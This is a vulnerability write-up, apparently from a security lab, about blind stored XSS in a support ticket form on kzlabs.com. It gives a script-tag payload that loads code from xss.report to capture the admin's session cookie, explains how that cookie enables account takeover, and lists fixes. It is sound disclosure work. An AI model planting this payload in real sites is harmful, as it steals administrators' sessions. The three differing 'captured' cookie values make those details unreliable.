---
## Title
Blind Cross-Site Scripting (XSS) in Support Ticket Form executes in Admin Panel

---
## Vulnerability Type
Blind XSS

---
## Summary
I identified a blind XSS in the Support Ticket form. The Name, Subject and  Message feilds all accept and store raw HTML without any sanitization. The payload does not execute on the user side- it fires silently in the admin panel wehn an admin opens the ticket to review it. This was confirmed via XSS reporting tool which captured the admin's session cookie, URL, and full browser details the moment the payload executed.

---
## Vulnerable Endpoint
```
https://kzlabs.com/64.php
```
**Injection points** Name, Subject and  Message fields in the Support Ticket creation form

---
## Steps to Reproduce
1. Navigate to the support Ticket form on the application
`https://kzlabs.com/64.php`
2. In the **Name**, **Subject** and **Message** fields enter the following payload:
```
'"><script src=https://xss.report/c/ali1></script>
```
3. Complete the CAPTCHA and click submit.
4. The payload does not fire on the user side - this is expected for blind XSS
5. Wait for the admin to log in and review it, the payload fires in the browser automatically 
7. The XSS reporting tool at `xss.report` captures the execution including  admin's session cookie, URL and full browser details.

---
## Payload Used
```
'"><script src=https://xss.report/c/ali1></script>
```

---
## Proof of Concept

**Screenshot 1** — Support Ticket form showing the blind XSS payload entered in the Name, Subject and Your Message fields before submission.

<img width="945" height="811" alt="lab__64" src="https://github.com/user-attachments/assets/1b5b19bc-f659-4629-9451-47846836e756" />


**Screenshot 2** — Alert box fired in the admin's browser on the Support Admin Panel page showing "Blind XSS Fired!" along with the captured domain `kzlabs.com`, the admin session cookie `PHPSESSID=evct7b599qbc5vcj27s5cbtq7e`, and the admin panel URL `https://kzlabs.com/64.php?view=admin`, confirming full blind XSS execution in the admin browser context.

<img width="1571" height="949" alt="lab-64" src="https://github.com/user-attachments/assets/2862ac57-e835-4aaf-bd86-93e75b777307" />




**Screenshot 3** — XSS reporting tool at xss.report showing the screenshot preview captured from the admin's browser session, with the Name, Subject and Message fields all flagged as INNERHTML sinks and the admin session cookie `e795e8526ef16163dd00e9af` visible in the top right corner confirming the full data capture.

<img width="1553" height="964" alt="lab 64_" src="https://github.com/user-attachments/assets/81717fcf-37b7-46c6-872c-a8adcc5ad9e1" />


---
## Impact
- The payload fires silently in the admin browser the moment admin open any support ticket - zero interaction needed beyond viewing the ticket
- Full admin session cookie captured - PHPSESSID=zap_adm_6gpmkuo1o1h - attacker can paste this into their browser and be immediately logged in as admin with no password needed.
- Since the admin has full access to all support tickets and user data a compromised admin account means full control over the entire platform
- Complete account takeover

---
## Remediation
1. Filter out HTML tags like `<script>`, `<img>`, `<svg>` from the Name, Subject and Message fields before saving anything to the database
2. Filter out JavaScript methods like `alert()`, `confirm()`, `prompt()` and block external script sources from being injected through input fields
3. If you're using PHP then use `htmlspecialchars()` function before rendering any user input back to the page
4. Implement a strict **Content Security Policy (CSP)** header that blocks loading of external scripts as this would have directly prevented the `xss.report` script from loading even if the payload got stored
5. Use Cloudflare as they have so many WAF rules that almost all XSS payloads will be blocked automatically before even reaching the server
